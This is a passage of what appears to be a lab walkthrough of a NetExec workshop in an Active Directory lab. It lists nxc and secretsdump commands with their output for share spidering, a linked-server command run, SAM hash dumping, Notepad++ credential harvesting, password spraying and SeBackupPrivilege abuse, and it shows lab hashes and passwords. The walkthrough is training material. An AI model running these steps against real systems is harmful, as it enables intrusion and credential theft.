<li>BloodHound doesn&rsquo;t show any interesting ACLs</li>
<li>Password spraying doesn&rsquo;t yield any results</li>
<li>We do have <code>READ</code> access to the <code>Destroyer_Access</code> SMB share though on <code>DANTOOINE</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.8 -u <span style="color:#e6db74">&#39;gMSA-scarif$&#39;</span> -H 889c32ef466ff6b367cf8adf7fce539b --shares                                                                      
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\g</span>MSA-scarif$:889c32ef466ff6b367cf8adf7fce539b                                                                                                 
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares                                                                                                                                          
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        Share           Permissions     Remark                                                                                                                         
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        -----           -----------     ------                                                                                                                         
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        ADMIN$                          Remote Admin                                                                                                                   
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        C$                              Default share                                                                                                                  
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        D$                              Default share                                                                                                                  
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        Destroyer_Access READ                                                                                                                                          
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        IPC$            READ            Remote IPC
</span></span></code></pre></div>
  <div class="admonition info">
    <div class="admonition-header">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336l24 0 0-64-24 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l48 0c13.3 0 24 10.7 24 24l0 88 8 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-80 0c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-208a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>
      <span>Info</span>
    </div>
      <div class="admonition-content">
        <p>I tried to enumerate this directory earlier as <code>droideka</code> through the MSSQL link but we didn&rsquo;t have the permissions.</p>
      </div>
  </div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u <span style="color:#e6db74">&#39;droideka&#39;</span> -p <span style="color:#e6db74">&#39;droideka&#39;</span> --local-auth -M link_xpcmd -o <span style="color:#e6db74">&#39;LINKED_SERVER=DANTOOINE\SQLEXPRESS&#39;</span> CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;powershell -c ls /Destroyer_Access&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ignore OPSEC in configuration is set and OPSEC unsafe module loaded                                                                                                                                            
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                      
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\d</span>roideka:droideka                                                                                                                                 
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running command on DANTOOINE<span style="color:#ae81ff">\S</span>QLEXPRESS: powershell -c ls /Destroyer_Access                                                                                
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executed command via linked server                                                                                                                         
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         ls : Access to the path <span style="color:#e6db74">&#39;C:\Destroyer_Access&#39;</span> is denied.                                                                                                       
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         At line:1 char:1                                                                                                                                               
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         + ls /Destroyer_Access                                                                                                                                         
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         + ~~~~~~~~~~~~~~~~~~~~                                                                                                                                         
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         + CategoryInfo          : PermissionDenied: <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\D</span>estroyer_Access:String<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Get-ChildItem<span style="color:#f92672">]</span>, UnauthorizedAccessExcept                                             
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         ion                                                                                                                                                            
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand                                                         
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR
</span></span></code></pre></div><h3 id="enumerating-the-destroyer_access-share-with-spider_plus">Enumerating the <code>Destroyer_Access</code> share with <code>spider_plus</code></h3>
<p>We can enumerate and download the files with the <code>spider_plus</code> module:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.8 -u <span style="color:#e6db74">&#39;gMSA-scarif$&#39;</span> -H 889c32ef466ff6b367cf8adf7fce539b -M spider_plus -o DOWNLOAD_FLAG<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\g</span>MSA-scarif$:889c32ef466ff6b367cf8adf7fce539b                                                                                                 
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started module spidering_plus with the following options:                                                                                                  
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>  DOWNLOAD_FLAG: True                                                                                                                                       
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     STATS_FLAG: True                                                                                                                                       
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> EXCLUDE_FILTER: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;print$&#39;</span>, <span style="color:#e6db74">&#39;ipc$&#39;</span><span style="color:#f92672">]</span>                                                                                                                         
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   EXCLUDE_EXTS: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ico&#39;</span>, <span style="color:#e6db74">&#39;lnk&#39;</span><span style="color:#f92672">]</span>                                                                                                                             
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>  MAX_FILE_SIZE: <span style="color:#ae81ff">50</span> KB                                                                                                                                      
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus                                                                                                         
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares                                                                                                                                          
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        Share           Permissions     Remark                                                                                                                         
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        -----           -----------     ------                                                                                                                         
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        ADMIN$                          Remote Admin                                                                                                                   
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        C$                              Default share                                                                                                                  
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        D$                              Default share                                                                                                                  
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        Destroyer_Access READ                                                                                                                                          
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        IPC$            READ            Remote IPC                                                                                                                     
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved share-file metadata to <span style="color:#e6db74">&#34;/root/.nxc/modules/nxc_spider_plus/10.0.0.8.json&#34;</span>.                                                                           
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMB Shares:           <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>ADMIN$, C$, D$, Destroyer_Access, IPC$<span style="color:#f92672">)</span>                                                                                           
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMB Readable Shares:  <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>Destroyer_Access, IPC$<span style="color:#f92672">)</span>                                                                                                           
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMB Filtered Shares:  <span style="color:#ae81ff">1</span>                                                                                                                                    
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Total folders found:  <span style="color:#ae81ff">0</span>                                                                                                                                    
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Total files found:    <span style="color:#ae81ff">2</span>                                                                                                                                    
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> File size average:    1.56 KB                                                                                                                              
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> File size min:        <span style="color:#ae81ff">86</span> B                                                                                                                                 
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> File size max:        3.04 KB                                                                                                                              
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> File unique exts:     <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>txt, pfx<span style="color:#f92672">)</span>                                                                                                                         
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Downloads successful: <span style="color:#ae81ff">2</span>                                                                                                                                    
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> All files processed successfully.
</span></span></code></pre></div><p>There are 2 files:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /root/.nxc/modules/nxc_spider_plus/10.0.0.8/Destroyer_Access
</span></span><span style="display:flex;"><span>info.txt  
</span></span><span style="display:flex;"><span>poe.pfx
</span></span></code></pre></div><p>Here is the <code>info.txt</code> file:</p>
<blockquote>
<p>Access key for the ship ! Also, stop taking note, it can be unsafe, you never know &hellip;</p></blockquote>
<p>The &ldquo;key for the ship&rdquo; is referencing the PFX certificate. We can use the new PFX options that were implemented in a recent <a href="https://github.com/Pennyw0rth/NetExec/pull/533">PR</a> by @mpgn.</p>
<p>We have administrative access to <code>DANTOOINE</code> as <code>poe</code>, meaning we can dump the SAM database that contains the <code>localadmin</code> user:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.8 -u <span style="color:#e6db74">&#39;poe&#39;</span> --pfx-cert loot/poe.pfx --sam                                                                                              
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\p</span>oe:15267fa2b302e8d98d13fb36d2dbbd64 <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>                                                                                                  
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping SAM hashes                                                                                                                                         
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        localadmin:500:aad3b435b51404eeaad3b435b51404ee:36fc6efd0c21742c771ec0bfd79757de:::                                                                            
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                        
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a674f72feb919a21239dc68880ffb55d:::                                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Added <span style="color:#ae81ff">4</span> SAM hashes to the database
</span></span></code></pre></div><p>The <code>info.txt</code> also has a hint saying to &ldquo;stop taking notes&rdquo;, this made me think about checking several areas on the machine where people could have left notes:</p>
<ul>
<li>PowerShell history</li>
<li>Recycle Bin</li>
<li>Notepad</li>
<li>Notepad++</li>
</ul>
<h3 id="enumerating-notepad-files">Enumerating Notepad++ files</h3>

  <div class="admonition info">
    <div class="admonition-header">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336l24 0 0-64-24 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l48 0c13.3 0 24 10.7 24 24l0 88 8 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-80 0c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-208a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>
      <span>Info</span>
    </div>
      <div class="admonition-content">
        <p>The <code>notepad++</code> module finds notepad++ unsaved backup files and lists their contents:</p>
      </div>
  </div>
<p><code>C:\Users\localadmin\AppData\Roaming\Notepad++\backup\new 1@2025-06-24_100732</code> contains some credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.8  -u <span style="color:#e6db74">&#39;localadmin&#39;</span> -H 36fc6efd0c21742c771ec0bfd79757de --local-auth -M notepad++
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> 
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DANTOOINE<span style="color:#ae81ff">\l</span>ocaladmin:36fc6efd0c21742c771ec0bfd79757de <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>NOTEPAD++   10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>ocaladmin<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\N</span>otepad++<span style="color:#ae81ff">\b</span>ackup<span style="color:#ae81ff">\n</span>ew 1@2025-06-24_100732
</span></span><span style="display:flex;"><span>NOTEPAD++   10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE            credentials
</span></span><span style="display:flex;"><span>NOTEPAD++   10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE            - wz<span style="color:#f92672">(}</span>ab4<span style="color:#f92672">=</span>/&amp;_f
</span></span><span style="display:flex;"><span>NOTEPAD++   10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE            - s&gt;cwp&gt;9c*x<span style="color:#f92672">=</span>s
</span></span><span style="display:flex;"><span>NOTEPAD++   10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        Notepad++ backup written to: /root/.nxc/modules/notepad++/10.0.0.8_localadmin_notepad_backup_1.txt
</span></span></code></pre></div><h3 id="password-spraying-">Password Spraying 💦</h3>
<p>Let&rsquo;s spray them across the users and we get a hit with <code>obiwan</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb targets.txt -u <span style="color:#e6db74">&#39;users/rebels.txt&#39;</span> -p users/passwords.txt --continue-on-success
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\o</span>biwan:wz<span style="color:#f92672">(}</span>ab4<span style="color:#f92672">=</span>/&amp;_f
</span></span></code></pre></div><h3 id="credentials----obiwan">Credentials 🔑 - <code>obiwan</code></h3>
<pre tabindex="0"><code>obiwan:wz(}ab4=/&amp;_f
</code></pre><h3 id="backup-operator">Backup Operator</h3>
<p>Another recent <a href="https://github.com/Pennyw0rth/NetExec/pull/537">PR</a> by @mpgn allows us to exploit the <code>SeBackupPrivilege</code> to dump the SAM, SYSTEM and SECURITY hives. Let&rsquo;s try that out blindly  as <code>obiwan</code> since I had a hunch:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb targets.txt -u <span style="color:#e6db74">&#39;obiwan&#39;</span> -p <span style="color:#e6db74">&#39;wz(}ab4=/&amp;_f&#39;</span> -M backup_operator
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                     
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:jedha<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                        
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\o</span>biwan:wz<span style="color:#f92672">(}</span>ab4<span style="color:#f92672">=</span>/&amp;_f STATUS_LOGON_FAILURE                                                                                                      
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\o</span>biwan:wz<span style="color:#f92672">(}</span>ab4<span style="color:#f92672">=</span>/&amp;_f STATUS_LOGON_FAILURE                                                                                                      
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\o</span>biwan:wz<span style="color:#f92672">(}</span>ab4<span style="color:#f92672">=</span>/&amp;_f                                                                                                                           
</span></span><span style="display:flex;"><span>BACKUP_O... 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering RemoteRegistry to start through named pipe...                                                                                                   
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\o</span>biwan:wz<span style="color:#f92672">(}</span>ab4<span style="color:#f92672">=</span>/&amp;_f                                                                                                                           
</span></span><span style="display:flex;"><span>BACKUP_O... 10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering RemoteRegistry to start through named pipe...                                                                                                   
</span></span><span style="display:flex;"><span>BACKUP_O... 10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Couldn<span style="color:#e6db74">&#39;t save HKLM\SAM: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied  on path \\10.0.0.8\SYSVOL\SAM                                               
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">BACKUP_O... 10.0.0.7        445    jedha            [-] Couldn&#39;</span>t save HKLM<span style="color:#ae81ff">\S</span>AM: RRP SessionError: code: 0xb7 - ERROR_ALREADY_EXISTS - Cannot create a file when that file already exists. on path <span style="color:#ae81ff">\\</span>10.0.0.7<span style="color:#ae81ff">\S</span>YSVOL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\S</span>AM
</span></span></code></pre></div><p>Unfortunately I wasn&rsquo;t the first person here 😓 so my dump didn&rsquo;t work as the files already existed in SYSVOL:</p>
<p><img src="_screenshots/Workshop-NetExec-backup-operator.png" alt=""></p>
<p>I had to download the files that were already accessible on the SYSVOL share then extract the secrets with <code>secretsdump</code> (ok I didn&rsquo;t use <code>nxc</code> for this part 😂).</p>
<h3 id="secretsdump">Secretsdump</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL     
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x0a68842a6bb2394984e82b607e3bf5e3
